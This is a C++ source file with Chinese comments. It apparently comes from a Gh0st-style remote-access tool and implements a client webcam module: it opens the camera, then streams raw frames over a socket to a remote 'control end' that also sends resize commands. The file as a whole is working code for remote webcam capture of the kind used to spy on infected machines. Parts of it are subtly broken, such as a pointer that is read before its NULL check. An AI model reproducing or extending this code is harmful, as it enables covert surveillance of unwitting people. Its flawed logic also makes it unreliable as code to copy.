// VideoManager.cpp: implementation of the CVideoManager class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "VideoManager.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
//#define MY_TEST
CVideoManager::CVideoManager(CClientSocket *pClient) : CManager(pClient)
{
//  	m_pVideoCap = NULL;
// 	m_pVideoCodec = NULL;
	m_pCapVideo = NULL;
 	m_bIsWorking = true;
//	m_bIsCompress = false;
	m_fccHandler = 0;
//#ifdef MY_TEST
//	m_hWnd = CreateWindow("#32770", /* Dialog */ "", WS_POPUP, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
//#endif
 	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL, true);
}

CVideoManager::~CVideoManager()
{
//	delete m_pVideoCap;
	InterlockedExchange((LPLONG)&m_bIsWorking, false);
	WaitForSingleObject(m_hWorkThread, INFINITE);
	CloseHandle(m_hWorkThread);
		delete m_pCapVideo;
		m_pCapVideo = NULL;
}

void CVideoManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	case COMMAND_NEXT:
		NotifyDialogIsOpen();
		break;
/*
	case COMMAND_WEBCAM_ENABLECOMPRESS: // 要求启用压缩
		{
			// 如果解码器初始化正常，就启动压缩功能
			if (m_pVideoCodec)
				InterlockedExchange((LPLONG)&m_bIsCompress, true);
		}
		break;

	case COMMAND_WEBCAM_DISABLECOMPRESS:
		InterlockedExchange((LPLONG)&m_bIsCompress, false);
		break;
*/
	case COMMAND_WEBCAM_RESIZE:
		ResetScreen(*((LPDWORD)(lpBuffer + 1)), *((LPDWORD)(lpBuffer + 5)));
		break;
	default:	
		break;
	}	
}

void CVideoManager::sendBITMAPINFO()
{
	DWORD	dwBytesLength = 1 + sizeof(BITMAPINFO);
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	if (lpBuffer == NULL)
		return;

	lpBuffer[0] = TOKEN_WEBCAM_BITMAPINFO;

	memcpy(lpBuffer + 1, m_pCapVideo->m_lpbmi, sizeof(BITMAPINFO));
	Send(lpBuffer, dwBytesLength);
	m_pCapVideo->GrabVideoFrames(TRUE,m_pCapVideo);

	delete [] lpBuffer;		
}

void CVideoManager::sendNextScreen()
{
	LPVOID	lpDIB = m_pCapVideo->GetDIB();
	unsigned char* pPos = (unsigned char*)lpDIB;
	int *p_len = (int*)lpDIB;
	int len = *p_len;
	if (lpDIB == NULL)
	{
		return;
	}
	// token + IsCompress + m_fccHandler + DIB
	int		nHeadLen = 1 + 1 + 4;
	
	UINT	nBufferLen = nHeadLen + len;
	
	LPBYTE	lpBuffer = new BYTE[nBufferLen];
	memset(lpBuffer,0,nBufferLen);
	if (lpBuffer == NULL)
		return;
	m_fccHandler = 1324;
	lpBuffer[0] = TOKEN_WEBCAM_DIB;
//	m_bIsCompress = FALSE;
	lpBuffer[1] = 0;
	memcpy(lpBuffer + 2, &m_fccHandler, sizeof(DWORD));
	
	UINT	nPacketLen = 0;
	{
		memcpy(lpBuffer + nHeadLen, pPos + 4, len);
		nPacketLen = len + nHeadLen;
	}
	//	m_pCapVideo->m_pDec->Decode((unsigned char*)lpBuffer + nHeadLen,len);
	Send(lpBuffer, nPacketLen);
	delete [] lpDIB;
	delete [] lpBuffer;
}

void CVideoManager::ResetScreen(int nWidth, int nHeight)//这不是设置吗？
{
	InterlockedExchange((LPLONG)&m_bIsWorking, false);
	WaitForSingleObject(m_hWorkThread, INFINITE);

	// 更新视频大小
	CCaptureVideo::m_nWidth = nWidth;
	CCaptureVideo::m_nHeight = nHeight;

//	InterlockedExchange((LPLONG)&m_bIsWorking, true);
//	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL, true);

}

DWORD WINAPI CVideoManager::WorkThread( LPVOID lparam )
{
	static	dwLastScreen = GetTickCount();
	CoInitialize(NULL);
	CVideoManager *pThis = (CVideoManager *)lparam;

	if (!pThis->Initialize())
	{
		pThis->Destroy();
		pThis->m_pClient->Disconnect();
		return -1;
	}
	pThis->sendBITMAPINFO();
	// 等控制端对话框打开
	pThis->WaitForDialogOpen();
	
	while (pThis->m_bIsWorking)
	{
		// 限制速度
//  		if ((GetTickCount() - dwLastScreen) < 50)
//  			Sleep(50);
//  		dwLastScreen = GetTickCount();
		pThis->sendNextScreen();
	}
	// 销毁已经存在实例，方便重新调整
	pThis->Destroy();

	return 0;
}

bool CVideoManager::Initialize()
{
	bool	bRet = false;
	CoInitialize(NULL);
	if (m_pCapVideo == NULL)
	{
		m_pCapVideo = new CCaptureVideo();
	}
	
	if (0 >= m_pCapVideo->EnumDevices(NULL))
	{
		return false;
	}
	
	if (m_pCapVideo->Start(0,NULL))
	{
		return false;
	}
	// 正在使用中
	
	bRet = true;

	return bRet;
}

void CVideoManager::Destroy()
{
	if (m_pCapVideo)
	{
		
		m_pCapVideo->GrabVideoFrames(FALSE);
		m_pCapVideo->Stop();
		delete m_pCapVideo;
		m_pCapVideo = NULL;
	}
}
